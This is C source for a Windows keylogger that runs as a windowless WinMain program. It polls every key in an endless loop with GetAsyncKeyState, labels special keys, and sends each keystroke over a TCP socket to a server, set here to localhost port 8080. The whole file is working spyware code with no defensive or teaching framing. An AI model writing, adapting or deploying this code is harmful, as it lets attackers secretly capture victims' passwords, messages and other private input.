#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>



void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip);
void startWinsock(WSADATA *wsaData);
SOCKET startSocket();
void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
void sendMsg(SOCKET client_socket, const char *msg);
void closeSocket(SOCKET client_socket);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    
    // socket details and setup
    SOCKET client_socket;
    struct sockaddr_in serv_addr;
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    const char* server_ip = "127.0.0.1";

    startWinsock(&wsaData);
    client_socket = startSocket();

    startLogging(&serv_addr, client_socket, server_ip);
    return 0;
}

void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {

    // connect to the server via socket
    connectToServer(serv_addr, client_socket, server_ip);

    // constantly loop through all the characters and check if they are currently being pressed or not
    char c;
    while (1) {
        for (c = 0; c < 255; c++) {
            short pressed = GetAsyncKeyState(c) & 0x1;
            if (pressed) {
                const char *text;

                if (c == VK_BACK) {
                    text = "[backspace]";
                    sendMsg(client_socket, text);
                } else if (c == VK_RETURN) {
                    text = "[enter]";
                    sendMsg(client_socket, text);
                } else if (c == VK_SHIFT) {
                    text = "[shift]";
                    sendMsg(client_socket, text);
                } else if (c == VK_CONTROL) {
                    text = "[ctrl]";
                    sendMsg(client_socket, text);
                } else if (c == VK_CAPITAL) {
                    text = "[caps]";
                    sendMsg(client_socket, text);
                } else if (c == VK_TAB) {
                    text = "[tab]";
                    sendMsg(client_socket, text);
                } else if (c == VK_MENU) {
                    text = "[alt]";
                    sendMsg(client_socket, text);
                } else {
                    if (c >= 0x20 && c <= 0x6F){
                        char str[2];
                        str[0] = c;
                        str[1] = '\0';
                        text = str;
                        sendMsg(client_socket, text);
                    }
                }
            }
        }
    }
}

// function to initialize Winsock so that we can use sockets
void startWinsock(WSADATA *wsaData) {
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        printf("WSAStartup failed\n");
        exit(EXIT_FAILURE);
    }
}

// function to start the socket and handles errors
SOCKET startSocket() {
    SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
        exit(EXIT_FAILURE);
    } else {
        printf("Socket created. \n");
    }
    return client_socket;
}

// function to connect this client to the server via socket
void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {

    if (inet_pton(AF_INET, server_ip, &serv_addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
        printf("\nConnection Failed. \n");
        printf("%i", client_socket);
        closesocket(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else{
        printf("Client connected to server.\n");
    }
}

// function to send message via socket connection
void sendMsg(SOCKET client_socket, const char *msg) {
    int sent = send(client_socket, msg, strlen(msg), 0);
    if (sent == -1){
        printf("Error sending message. The connection must have been cut.\n");
    } else{
        printf("%s sent, status = %i \n", msg, sent);
    }
}

// function to close the socket and clean up the resources that are no longer being used
void closeSocket(SOCKET client_socket) {
    closesocket(client_socket);
    WSACleanup();
}